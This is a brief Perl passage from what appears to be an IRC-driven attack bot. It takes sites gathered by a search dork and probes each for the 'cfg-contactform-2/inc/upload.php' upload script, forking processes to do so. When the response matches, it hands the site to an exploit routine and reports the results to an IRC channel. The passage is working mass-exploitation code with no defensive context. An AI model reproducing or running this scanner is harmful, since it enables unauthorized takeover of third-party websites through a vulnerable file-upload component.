	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$chan","$cfg2logo(4@3$engine15)14 Scan finish  15$dork"); }
			my $cfg2 = "http://".$site."cfg-contactform-2/inc/upload.php";
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				my $coba2 = &get_content($cfg2);sleep(1);
				if ($coba2 =~ /filename/ || $coba2 =~ /"filename":" - 002."/ ) {
				    &cfg2_xpl($cfg2,$chan,$site,$engine);		
				} else { }
            } exit; sleep(2); }
        }
    }
